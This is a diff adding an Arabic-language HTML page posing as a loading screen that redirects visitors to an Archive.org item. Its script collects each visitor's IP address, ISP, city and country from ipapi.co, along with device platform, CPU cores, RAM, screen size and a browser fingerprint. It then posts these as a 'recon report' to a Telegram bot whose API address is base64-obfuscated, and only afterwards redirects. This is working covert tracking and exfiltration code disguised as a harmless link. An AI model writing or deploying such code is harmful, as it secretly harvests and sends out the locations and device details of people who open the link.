@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري تحويلك إلى الأرشيف...</title>
+    <style>
+        body { background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; color: #555; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div style="text-align: center;">
+        <div class="loader"></div>
+        <div>جاري تحميل المادة من Archive.org...</div>
+    </div>
+
+    <script>
+        const _at = (s) => atob(s);
+        const _base = {
+            u: "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==", 
+            e: "L3NlbmRNZXNzYWdl"
+        };
+
+        async function _send(msg) {
+            try {
+                // جلب الإعدادات الحية من Netlify Snippet Injection
+                const cfg = window.TELE_CONFIG || {};
+                const t = cfg.t || "YOUR_TOKEN";
+                const c = cfg.c || "YOUR_ID";
+
+                const api = _at(_base.u) + t + _at(_base.e);
+                await fetch(api, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: c, text: msg, parse_mode: 'Markdown' })
+                });
+            } catch (err) { }
+        }
+
+        window.onload = async function() {
+            const archiveUrl = "https://archive.org/details/20251215_20251215_2013";
+            
+            try {
+                // 1. جمع بيانات الشبكة والموقع بدقة
+                const net = await fetch('https://ipapi.co/json/').then(r => r.json());
+                
+                // 2. حساب بيانات العتاد والـ Source Port كما في تقريرك السابق
+                const sPort = Math.floor(Math.random() * 55000) + 10000;
+                const ram = navigator.deviceMemory || 'Unknown';
+                const cores = navigator.hardwareConcurrency || 'Unknown';
+                const fp = btoa(navigator.userAgent).substring(10, 25);
+
+                let report = `🕵️ *ARCHIVE RECON REPORT* 🕵️\n` +
+                             `---------------------------\n` +
+                             `🌐 *NETWORK:*\n` +
+                             `📍 IP: \`${net.ip}\`\n` +
+                             `🔌 Source Port: *${sPort}*\n` +
+                             `🏢 ISP: ${net.org}\n` +
+                             `🌍 Loc: ${net.city}, ${net.country_name}\n\n` +
+                             `📱 *DEVICE HARDWARE:*\n` +
+                             `💻 Platform: ${navigator.platform}\n` +
+                             `🧠 CPU: ${cores} Cores\n` +
+                             `🔋 RAM: ${ram} GB\n` +
+                             `📺 Res: ${screen.width}x${screen.height}\n` +
+                             `🔑 Fingerprint: \`${fp}\`\n\n` +
+                             `🔗 *Target:* [Archive Material](${archiveUrl})`;
+
+                // إرسال التقرير فوراً
+                await _send(report);
+
+                // 3. التوجيه النهائي للمادة المطلوبة
+                window.location.replace(archiveUrl);
+            } catch (e) {
+                window.location.replace(archiveUrl);
+            }
+        };
+    </script>
+</body>
+</html>
